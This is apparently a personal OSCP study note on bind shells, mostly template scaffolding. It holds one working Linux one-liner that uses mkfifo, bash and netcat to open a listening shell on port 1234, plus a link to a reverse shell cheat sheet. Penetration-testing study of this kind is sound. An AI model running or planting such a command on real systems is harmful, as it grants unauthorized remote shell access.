---
title: technique-note
type: note
permalink: oscp/templates/technique-note
---

---
title: bind shell
category: other
created: 2026-08-11
tags: [technique, other]
---

# bind shell

## What it is
- Another type of shell but the target sets up the listener this time

## When to use it
- Signals / prerequisites that make this the right move:

## Commands

#### Linux Bind Shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

## Things to know
- Port is connected via `netcat` after target sets up listener
- [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet

## Boxes where I used this
- [[]]

## Gotchas / troubleshooting
- Things that broke and how you fixed them:

## References
-